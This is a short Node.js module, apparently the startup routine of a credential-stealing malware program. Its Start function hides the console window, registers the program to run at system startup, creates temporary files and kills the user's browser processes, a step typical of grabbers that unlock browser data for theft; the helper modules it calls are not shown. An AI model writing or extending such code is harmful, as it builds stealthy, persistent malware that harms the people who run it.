async function Start() {
  const hideConsole = require("../../functions/hide/ConsoleWin");
  hideConsole();
  const add_to_startup = require("../../functions/system/startup");
  const Tmps = require("../../functions/system/temps");
  const kill = require("../../functions/system/kill");
  add_to_startup();
  await Tmps.create();
  kill.Browsers();
}

module.exports = { Start };
